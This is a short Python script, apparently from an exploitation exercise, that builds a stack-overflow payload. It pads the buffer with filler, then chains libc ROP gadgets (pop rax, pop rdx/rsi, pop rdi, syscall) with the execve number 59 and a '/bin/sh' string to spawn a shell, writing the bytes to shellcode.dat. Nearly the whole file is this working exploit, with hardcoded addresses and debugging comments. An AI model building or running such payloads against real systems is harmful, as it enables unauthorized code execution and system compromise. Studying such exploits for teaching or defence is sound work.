#!/usr/bin/python

import struct

import binascii

#max 0x195000 of offset
LIBC_OFFSET = 0x7ffff7a3a000
g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
d1 = 59
# g2 = LIBC_OFFSET + 0x18ac7c + 0x2c #  pop rdx
# d2 = 0
# d3 = 0
# g3 = LIBC_OFFSET + 0x7a799 + 0xc # rsi +r15
# d4 = 0
# d5 = 0
g2 = LIBC_OFFSET + 0xf54f9 #pop rdx + rsi
d2 = 0x00
d3 = 0x00
g4 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
d6 = 0x2f62696e2f2f7368 #/bin//sh
d7 = 0x00
retString = 0x7fffffffe140
g5 = LIBC_OFFSET + 0x177452 + 0x3 #push rsp
g6 = LIBC_OFFSET + 0x132bae + 0xe #syscall

# removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
shellcode =''
for i in range(1,35) :
    shellcode += struct.pack('<x')
shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
shellcode += 'A'*(994)
shellcode += struct.pack('<q', g1)#pop rax ; ret
shellcode += struct.pack('<q', d1) #59
shellcode += struct.pack('<q', g2)#pop rdx + rsi
shellcode += struct.pack('<q', d2) #0
shellcode += struct.pack('<q', d3)# 0
# shellcode += struct.pack('<q', g3)
# shellcode += struct.pack('<q', d4)
# shellcode += struct.pack('<q', d5)
# shellcode += struct.pack('<q', g5)
shellcode += struct.pack('<q', g4)#= pop rdi
shellcode += struct.pack('<q', retString)
# shellcode += struct.pack('<q', d7)
shellcode += struct.pack('<q', g6) #syscall

print ("shellcode: "+ shellcode)
with open("shellcode.dat", "wb") as f:
    f.write(shellcode)
print (binascii.hexlify(shellcode))
print ("g1: %x" % (g1))
print ("d1: %x" % (d1))
print ("g2: %x" % (g2))
print ("d2: %x" % (d2))
# print ("d3: %x" % (d3))
# print ("g3: %x" % (g3)) #bug here
# print ("d4: %x" % (d4))
# print ("d5: %x" % (d5))
print ("g4: %x" % (g4))
print ("d6: %x" % (d6))
print ("ret in buffer: %x" % (retString))
print ("g5: %x" % (g5))
print ("g6: %x" % (g6))